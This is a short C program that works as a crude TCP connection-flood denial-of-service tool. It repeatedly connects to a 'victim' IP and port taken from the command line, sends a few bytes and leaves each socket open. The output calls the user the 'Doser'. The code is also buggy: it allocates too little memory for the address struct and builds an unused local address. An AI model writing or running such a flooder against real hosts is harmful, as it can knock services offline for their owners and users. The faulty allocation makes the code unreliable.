#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <errno.h>

int setup(struct sockaddr_in **, char **);

void shack_attack(char **argv)
{
    struct sockaddr_in *victim;
    int socket_fd = 1;
    for (;;) {
        socket_fd = setup(&victim, argv);
        if (connect(socket_fd, (struct sockaddr *) victim, sizeof(*victim)) == -1) {
            fprintf(stdout, "Failed to TCP peer\t:\t%s:%u\n"
                            "%s\n", inet_ntoa(victim->sin_addr), ntohs(victim->sin_port), strerror(errno));
            break;
        };

        send(socket_fd, &(int) { 1 }, sizeof(int),  0);
        // close(socket_fd);
        free(victim);
        usleep(50000);
    }
    puts("Chicken out");
}

int setup(struct sockaddr_in **victim, char **argv)
{
    int master_fd = -1;
    if ((master_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in server_sock_in;
    memset(&server_sock_in, 0, sizeof(server_sock_in));

    server_sock_in.sin_family = AF_INET;
    server_sock_in.sin_port   = htons(rand() % 1000 + 2000);
    server_sock_in.sin_addr.s_addr = inet_addr("127.0.0.1");

    struct sockaddr_in *victim_in = *victim;
    victim_in = calloc(1, sizeof(victim_in));

    victim_in->sin_family = AF_INET;
    victim_in->sin_port   = htons(strtol(argv[2], NULL, 10));
    victim_in->sin_addr.s_addr = inet_addr(argv[1]); // argv[1] is server's ip

    *victim = victim_in;

    fprintf(stdout, "Doser's meta\t\t:\t%s:%u\n",
           inet_ntoa(server_sock_in.sin_addr), ntohs(server_sock_in.sin_port));
    fprintf(stdout, "Victim's meta\t\t:\t%s:%u\n\n",
           inet_ntoa(victim_in->sin_addr), ntohs(victim_in->sin_port));

    if (setsockopt(master_fd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0) {
        perror("setsockopt(SO_REUSEADDR) failed"); 
    }
    return master_fd;
}


int main(int argc, char **argv)
{
    shack_attack(argv);
    return 0;
}
